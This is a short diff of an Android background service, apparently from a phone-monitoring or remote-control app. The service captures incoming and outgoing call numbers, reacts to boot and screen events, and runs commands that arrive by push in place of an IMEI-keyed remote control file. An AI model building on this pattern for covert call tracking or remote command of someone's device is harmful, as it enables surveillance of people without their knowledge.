@@ -186,47 +186,45 @@ public class MainService extends Service {
                 WakeLocks wl = new WakeLocks(MainService.this);
                 wl.lock();
 
-                L.d(TAG, "onStartCommand");
-
                 if (intent != null) {
                     String action = intent.getAction();
+                    L.d(TAG, "onStartCommand get: " + action);
                     if (action != null) {
                         switch (action) {
                             case C.ACTION_BOOT:
-                                L.d(TAG, "Get boot");
                                 cc.runModules(C.ACTION_BOOT, null);
                                 break;
                             case C.ACTION_ALARM:
-                                L.d(TAG, "Get alarm");
                                 Logger.alarm(context);
                                 cc.runModules(C.ACTION_ALARM, null);
                                 break;
                             case C.ACTION_SCREENON:
-                                L.d(TAG, "Get screenOn");
                                 cc.runModules(C.ACTION_SCREENON, null);
                                 break;
                             case C.ACTION_OUTGOINGCALL:
-                                L.d(TAG, "Get outgoingCall");
                                 String outNumber = intent.getStringExtra("phoneNumber");
                                 if (outNumber != null)
                                     cc.runModules(C.ACTION_OUTGOINGCALL, outNumber);
                                 break;
                             case C.ACTION_INCOMINGCALL:
-                                L.d(TAG, "Get incomingCall");
                                 String number = intent.getStringExtra("phoneNumber");
                                 if (number != null)
                                     cc.runModules(C.ACTION_INCOMINGCALL, number);
                                 break;
                             case C.ACTION_COMMAND:
-                                L.d(TAG, "Get command");
                                 cc.parseCommand(intent.getStringExtra("command"));
                                 break;
-                            case C.ACTION_WAKEUP:
-                                L.d(TAG, "Get wakeup");
+                            case C.ACTION_PUSH:
                                 try {
+                                    /*
                                     pw.getFile(Init.DEVICES_DIR + Init.DEVICE_NAME_IMEI + C.CONTROL_Q_FILE,
                                             "/" + Init.DEVICE_NAME_IMEI + C.CONTROL_Q_FILE);
                                     U.parseCtlq(cc);
+                                    */
+                                    String cmd = intent.getStringExtra("command");
+                                    if (cmd != null) {
+                                        cc.parseCommand(cmd);
+                                    }
                                 } catch (Exception e) {
                                     L.d(TAG, "Error getting file: " + e.toString());
                                 }
